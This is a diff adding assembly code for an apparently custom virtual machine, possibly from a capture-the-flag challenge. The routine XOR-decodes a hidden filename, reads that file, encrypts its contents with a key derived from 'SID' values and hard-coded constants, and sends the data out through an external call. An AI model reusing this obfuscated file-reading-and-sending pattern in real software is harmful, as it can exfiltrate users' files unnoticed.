@@ -1,0 +1,54 @@
+push r10
+push r11
+push r12
+push r13
+push r14
+push r15
+push r16
+push r17
+push r18
+push r19
+xor [gp+0x110], 0x85f7477c57964b3b 
+mov r21, gp
+add r21, 0x110
+mov r22, gp
+add r22, 0x200
+# read file to gp+0x200 segment
+# size is returned in AC register
+# r21 - ptr to filename, r22 - ptr to file data
+read r21, r22
+# save file size in r33
+mov r33, ac
+# encrypt file
+# generate key from sid
+# xor FILENAME ^ SID vals
+xor [gp+0x60], [gp+0x110]
+xor [gp+0x68], [gp+0x110]
+mov [gp+0x70], [gp+0x60]
+mov [gp+0x78], [gp+0x68]
+xor [gp+0x70], 0xeff005d9999c197c
+xor [gp+0x78], 0xb49350cc51b6a860
+mov r30, r22
+mov r31, r33
+mov r32, gp
+add r32, 0x60
+mov r33, r32
+add r33, 0x10
+native r32
+native r33
+encrypt r30, r31, r32, r33
+# send file
+mov r10, [gp+0x40]
+mov r22, r18
+mov r13, 0x0
+mov r15, 0x10
+mov r14, gp
+add r14, 0x100
+native r14
+mov r11, gp
+add r11, 0x200
+native r11
+mov r12, ac
+# send data
+excall6 r22
+exit
